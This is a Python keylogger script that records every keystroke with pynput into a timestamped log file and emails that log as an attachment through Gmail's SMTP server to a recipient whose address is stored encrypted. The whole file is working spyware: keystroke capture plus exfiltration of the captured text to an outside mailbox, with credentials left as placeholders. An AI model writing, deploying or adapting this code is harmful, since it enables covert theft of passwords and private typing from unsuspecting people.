import pynput
from pynput.keyboard import Listener
import logging
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import os
import datetime
from cryptography.fernet import Fernet

log_dir = "C:\\Keylogger"
if not os.path.exists(log_dir):
    os.makedirs(log_dir)

log_file = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S") + ".txt"
logging.basicConfig(filename=os.path.join(log_dir, log_file), level=logging.DEBUG, format='%(asctime)s: %(message)s')

encrypted_email_address = "ENCRYPTED_EMAIL_HERE"
encrypted_email_password = "ENCRYPTED_PASSWORD_HERE"
encrypted_email_recipient = "ENCRYPTED_RECIPIENT_HERE"

key = b'REAL_KEY_HERE'

def decrypt(encrypted_message):
    cipher_suite = Fernet(key)
    return cipher_suite.decrypt(encrypted_message.encode()).decode()

def on_press(key):
    logging.info(str(key))

def send_email():
    msg = MIMEMultipart()
    msg['From'] = decrypt(encrypted_email_address)
    msg['To'] = decrypt(encrypted_email_recipient)
    msg['Subject'] = "Keylogger Log"

    with open(os.path.join(log_dir, log_file), "rb") as attachment:
        part = MIMEBase("application", "octet-stream")
        part.set_payload(attachment.read())

    encoders.encode_base64(part)
    part.add_header("Content-Disposition", f"attachment; filename={log_file}")
    msg.attach(part)

    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(decrypt(encrypted_email_address), decrypt(encrypted_email_password))
    server.sendmail(decrypt(encrypted_email_address), decrypt(encrypted_email_recipient), msg.as_string())
    server.quit()

with Listener(on_press=on_press) as listener:
    listener.join()

send_email()
